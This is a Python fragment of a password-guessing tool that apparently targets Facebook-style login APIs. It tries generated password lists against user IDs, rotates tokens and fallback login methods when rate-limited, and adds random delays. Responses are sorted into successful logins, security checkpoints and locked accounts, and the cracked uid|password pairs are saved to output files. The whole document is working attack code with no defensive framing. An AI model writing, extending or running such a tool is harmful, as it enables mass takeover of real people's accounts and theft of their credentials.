# ── result processor ──────────────────────────────────────────────────────────
def classify(resp):
    if not isinstance(resp, dict):
        return 'MISS'

    err = str(resp.get('error', '')).lower()
    if err == 'rate_limited' or resp.get('status_code') == 429:
        return 'RATELIMIT'
    if err in ('network_error', 'ssl_error', 'non_json_response', 'unexpected_error'):
        return 'NETERR'

    if resp.get('session_key') and isinstance(resp.get('access_token'), str) and len(resp.get('access_token', '')) > 15:
        return 'HIT'
    if isinstance(resp.get('access_token'), str) and len(resp['access_token']) > 15 and not resp.get('error_msg') and not resp.get('error'):
        return 'HIT'

    err_data = resp.get('error_data') if isinstance(resp.get('error_data'), dict) else {}
    err_obj = resp.get('error') if isinstance(resp.get('error'), dict) else {}
    err_msg = ' '.join(
        str(x) for x in (
            resp.get('error_msg'),
            err_data.get('url'),
            err_obj.get('message'),
            err_obj.get('error_user_msg'),
        ) if x
    ).lower()

    err_code = str(resp.get('error_code') or err_obj.get('code') or '')
    err_subcode = str(err_data.get('error_subcode') or err_obj.get('error_subcode') or '')

    cp_url = str(err_data.get('url', '')).lower()
    if err_subcode in ('1349174', '1349193', '1349196') or '/checkpoint' in cp_url or 'checkpoint/' in cp_url:
        return 'CP'

    if err_code in ('368', '405') or any(k in err_msg for k in ('account has been locked', 'account disabled', 'suspended')):
        return 'LOCKED'

    return 'MISS'

def _append_line(path, line):
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line)

def process(uid, pwd, resp):
    global found_accounts
    status = classify(resp)
    year   = guess_year(uid)

    if status == 'HIT':
        with scan_lock:
            found_accounts += 1
        line = f"{uid}|{pwd}|{year}\n"
        print(f"\n{GREEN}[HIT] {uid} | {pwd} | {year}{RESET}")
        _append_line(OUTPUT_HIT, line)
        return True

    if status == 'CP':
        line = f"{uid}|{pwd}|{year}\n"
        print(f"\n{YELLOW}[CP]  {uid} | {pwd} | {year}{RESET}")
        _append_line(OUTPUT_CP, line)
        return False

    if status == 'LOCKED':
        _append_line(OUTPUT_LOCK, f"{uid}|{year}\n")
        return False

    return False

# ── worker ────────────────────────────────────────────────────────────────────
def worker(uid, method_idx=0):
    global total_scanned
    if stop_event.is_set():
        return False

    token     = get_token()
    fn        = METHODS[method_idx % len(METHODS)]
    fallback  = METHODS[(method_idx + 1) % len(METHODS)]
    passwords = build_password_list(uid)
    net_errs  = 0

    for pwd in passwords:
        if stop_event.is_set():
            break
        resp = fn(uid, pwd, token)
        state = classify(resp)

        if state == 'RATELIMIT':
            token = get_token()
            resp = fallback(uid, pwd, token)
            state = classify(resp)

        if state == 'NETERR':
            net_errs += 1
            if net_errs >= 3:
                break
            jitter(0.05, 0.08)
            continue

        net_errs = 0
        if process(uid, pwd, resp):
            with scan_lock:
                total_scanned += 1
            return True
        jitter()

    with scan_lock:
        total_scanned += 1
        scanned_now = total_scanned
        hits_now    = found_accounts
        rl_now      = rate_limited

    with file_lock:
        sys.stdout.write(
            f"\r{WHITE}[*] Scan: {CYAN}{scanned_now}{WHITE} | "
            f"Hit: {GREEN}{hits_now}{WHITE} | "
            f"RateLimit: {RED}{rl_now}{RESET}   "
        )
        sys.stdout.flush()
    return False

